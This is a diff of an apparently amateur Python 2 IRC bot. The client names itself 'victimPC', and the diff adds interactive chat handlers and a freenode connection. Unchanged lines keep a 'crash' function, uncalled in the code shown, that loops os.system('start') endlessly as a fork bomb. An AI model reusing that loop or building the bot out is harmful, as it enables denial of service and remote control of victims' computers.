@@ -1,5 +1,6 @@
 import socket 
 import os
+import sys
 from requests import *
 import irc.client
 
@@ -13,22 +14,61 @@ private_ip = socket.gethostbyname(socket.gethostname())
 s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
 s.bind(('', 80))
 
+channel = '#python'
+USERNAME = 'victimPC'
 
+
+def handlers(_server):
+    _server.add_global_handler('welcome', on_connection)
+    _server.add_global_handler('join', on_join)
+    _server.add_global_handler('disconnect', on_disconnect)
+    _server.add_global_handler('privmsg', on_msg)
+    _server.add_global_handler('pubmsg', on_msg)
+    
+def on_connection(_server, event):
+    global channel
+    channel = raw_input('What channel or user to message?')
+    if irc.client.is_channel(channel):
+        _server.join(channel)
+        return
+
+def on_join(_server, event):
+    main_input(_server)
+
+def on_disconnect(_server, event):
+    sys.exit("Disconnected!")
+
+def on_msg(_server, event):
+    print event
+    
+def main_input(_server):
+    while True:
+        msg = raw_input(USERNAME + ": ")
+        if msg.lower() == '/quit':
+            _server.quit()
+            break
+        else:
+            _server.privmsg(channel, msg)
+        
 def main():
-	print 'started'
-	reactor = irc.client.Reactor()
-	server = reactor.server()
-	server.connect(<ip to IRC server goes here>, 6667, 'victimPC')
-	server.privmsg('#general', 'rekt')
-	reactor.process_forever()
+    reactor = irc.client.Reactor()
+    
+    try:
+        server = reactor.server().connect('chat.freenode.net', 6667, USERNAME )
+    except irc.client.ServerConnectionError:
+        print('ServerConnectoinError')
 
+    handlers(server)
+    
 
+    reactor.process_forever()
 
+    
 #crash
 def crash():
   while True:
     os.system('start')
 
 
-if __name__ == '__main__':
-	main()
+if __name__ == '__main__':     
+    main()
